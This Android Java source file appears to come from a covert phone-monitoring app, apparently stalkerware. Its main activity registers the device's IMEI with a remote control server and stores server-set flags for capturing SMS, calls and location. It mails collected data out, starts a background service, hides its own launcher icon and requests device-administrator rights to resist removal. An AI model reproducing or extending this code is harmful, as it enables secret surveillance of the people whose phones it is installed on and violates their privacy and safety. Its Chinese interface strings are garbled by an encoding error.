package com.android.smsclient;

import java.util.ArrayList;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.app.ProgressDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;

import com.android.db.WelComeMailBody;
import com.android.service.ClientService;
import com.android.service.DeviceReceiver;
import com.android.thread.RequestThread;
import com.android.utils.SendMailUtils;
import com.android.utils.Utils;

public class MainActivity extends Activity {

	private EditText code;
	private EditText phone;
	private Button queding;
	private DevicePolicyManager Dmanager;
	private OnClickListenerImpl listener;
	private RequestThread auththread;
	private ProgressDialog pd;
	private String authurl = "control/client!AuthDevice.action";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		code = (EditText) this.findViewById(R.id.code);
		phone = (EditText) this.findViewById(R.id.phone);
		queding = (Button) this.findViewById(R.id.queding);
		listener = new OnClickListenerImpl();
		queding.setOnClickListener(listener);
	}

	class OnClickListenerImpl implements OnClickListener {

		@Override
		public void onClick(View but) {
			// TODO Auto-generated method stub
			String scode = code.getText().toString();
			String sphone = phone.getText().toString();
			if ("".equals(scode)) {
				Utils.ShowToast(MainActivity.this, "�����벻��Ϊ��");
				return;
			}
			if ("".equals(sphone)) {
				Utils.ShowToast(MainActivity.this, "�ֻ��Ų���Ϊ��");
				return;
			}
			if (Utils.isNetworkConnected(MainActivity.this)) {
				pd = Utils.createProgressDialog(MainActivity.this);
				pd.setMessage("������֤��...");
				pd.show();
				List<NameValuePair> lnvp = new ArrayList<NameValuePair>();
				lnvp.add(new BasicNameValuePair("mapparam.code", scode));
				lnvp.add(new BasicNameValuePair("mapparam.phone", sphone));
				lnvp.add(new BasicNameValuePair("mapparam.deviceimei", Utils
						.GetImei(MainActivity.this)));
				lnvp.add(new BasicNameValuePair("mapparam.clientid", Utils
						.getStringConfig(MainActivity.this, "clientid", "")));
				auththread = new RequestThread(authurl, lnvp, handler);
				auththread.start();
			} else {
				Utils.ShowToast(MainActivity.this, "�����������");
			}
		}

	}

	private Handler handler = new Handler() {

		@Override
		public void handleMessage(Message msg) {
			// TODO Auto-generated method stub
			super.handleMessage(msg);
			try {
				pd.dismiss();
				if (msg.what == 1 && msg.obj != null) {
					JSONObject jo = (JSONObject) msg.obj;
					if (jo.getInt("state") == 1) {
						if (jo.has("sms")) {
							Utils.setBooleanConfig(MainActivity.this, "sms",
									jo.getBoolean("sms"));
						}
						if (jo.has("call")) {
							Utils.setBooleanConfig(MainActivity.this, "call",
									jo.getBoolean("call"));
						}
						if (jo.has("loc")) {
							Utils.setBooleanConfig(MainActivity.this, "loc",
									jo.getBoolean("loc"));
						}
						if (jo.has("count")) {
							Utils.setIntConfig(MainActivity.this, "count",
									jo.getInt("count"));
						}
						if (jo.has("id")) {
							Utils.setIntConfig(MainActivity.this, "deviceid",
									jo.getInt("id"));
						}
						Utils.ShowToast(MainActivity.this, "��֤�ɹ�");
						WelComeMailBody mailbody = new WelComeMailBody(
								getApplicationContext());
						SendMailUtils.SendAllDataToMail(
								getApplicationContext(), mailbody);
						Intent service = new Intent(getApplicationContext(),
								ClientService.class);
						getApplicationContext().startService(service);
						ShowHideDialog();
					} else {
						Utils.ShowToast(MainActivity.this, jo.getString("msg"));
					}
				} else {
					Utils.ShowToast(MainActivity.this, "�������������");
				}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				Utils.ShowToast(MainActivity.this, "���ݴ���");
			}
		}

	};

	private void ShowHideDialog() {
		Builder builder = Utils.createAlertDialog(this);
		builder.setTitle("��֤�ɹ�");
		builder.setMessage("����ͼ��");
		builder.setPositiveButton("ȷ��", new DialogInterface.OnClickListener() {

			@Override
			public void onClick(DialogInterface arg0, int arg1) {
				// TODO Auto-generated method stub
				hideicon();
				regdevice();
				MainActivity.this.finish();
			}

		});
		builder.create().show();

	}

	private void hideicon() {
		PackageManager pm = MainActivity.this.getPackageManager();
		pm.setComponentEnabledSetting(MainActivity.this.getComponentName(),
				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
				PackageManager.DONT_KILL_APP);
	}

	private void regdevice() {
		Dmanager = (DevicePolicyManager) this
				.getSystemService(Context.DEVICE_POLICY_SERVICE);
		ComponentName con = new ComponentName(this, DeviceReceiver.class);
		if (!Dmanager.isAdminActive(con)) {
			Intent localIntent = new Intent(
					"android.app.action.ADD_DEVICE_ADMIN");
			localIntent.putExtra("android.app.extra.DEVICE_ADMIN", con);
			localIntent.putExtra("android.app.extra.ADD_EXPLANATION", "�豸������");
			startActivityForResult(localIntent, 0);
		}
	}

}
